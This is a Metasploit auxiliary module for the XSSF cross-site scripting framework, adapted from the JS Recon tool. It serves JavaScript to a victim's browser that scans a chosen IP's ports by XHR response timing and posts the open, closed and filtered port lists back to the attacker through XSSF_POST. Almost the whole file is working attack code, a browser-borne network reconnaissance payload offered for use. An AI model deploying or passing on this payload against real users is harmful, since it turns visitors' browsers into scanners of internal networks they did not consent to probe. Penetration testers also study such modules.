require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
# This attack is using JS RECON (HTML5 based JavaScript Network Reconnaissance Tool)
# Visit http://www.andlabs.org/tools/jsrecon/jsrecon.html for more details
# JS RECON By "Attack & Defense Labs"
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Port scanner',
			'Description' => 'Scans given server IP for opened ports.',
			'Author' 	  => 'Attack & Defense Labs (Original Script)' 
		))
		
		register_options(
			[
				OptPort.new('startPort', [true, 'Start port', 75]),
				OptPort.new('endPort', [true, 'End port (Bigger range is, slower is the detection...)', 85]),
				OptAddress.new('IP', [true, 'IP adress to scan ports', '127.0.0.1'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			var ip 			= '#{datastore['IP']}';
			var start_port 	= #{datastore['startPort']};
			var end_port 	= #{datastore['endPort']};

			var current_port	= 0;
			var ps_open_ports	= [];
			var ps_closed_ports	= [];
			var ps_timeout_ports= [];
			var blocked_ports 	= [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
			var open_port_max	= 300;
			var closed_port_max	= 2000;
			var start_time;
		
			function scan_ports_xhr()
			{
				if(init_port_ps())
				{
					XSSF_POST("Host '#{datastore['IP']}' (Ports '#{datastore['startPort']}' to '#{datastore['endPort']}')\\n\\nOpened Ports:\\n" + ps_open_ports.join(',\\n') + "\\n\\nClosed/Blocked Ports:\\n" + ps_closed_ports.join(',\\n') + "\\n\\nFiltered/Application Type 3&4 Ports:\\n" + ps_timeout_ports.join(',\\n'), '#{self.name}');
					return;
				}
				if(is_blocked(current_port))
				{
				   setTimeout("scan_ports_xhr()", 1);
				   return;
				}
				start_time = (new Date).getTime();
				try
				{
					XSSF_XHR.open('GET', "http://" + ip + ":" + current_port);
					XSSF_XHR.send();
					setTimeout("check_ps_xhr()", 5);
				}
				catch(err)
				{
					return;
				}
			}
	
			function init_port_ps()
			{
				if(current_port == 0)					current_port = start_port;
				else if(current_port == end_port)		return true;
				else									current_port++;

				return false;
			}
	
			function is_blocked(port_no)
			{
				for(var i = 0; i < blocked_ports.length; i++)
					if(blocked_ports[i] == port_no)
						return true;

				return false;
			}
	
			function check_ps_xhr()
			{
				var interval = (new Date).getTime() - start_time;
				if(XSSF_XHR.readyState == 1)
				{
					if(interval > closed_port_max) {
						ps_timeout_ports.push(current_port);
						setTimeout("scan_ports_xhr()", 1);
					}
					else
						setTimeout("check_ps_xhr()", 5);
				}
				else
				{
					if(interval < open_port_max)
						ps_open_ports.push(current_port);
					else
						ps_closed_ports.push(current_port);

					setTimeout("scan_ports_xhr()", 1);
				}
			}
			setTimeout("scan_ports_xhr()", 1);
		}

		send_response(cli, code)
	end
end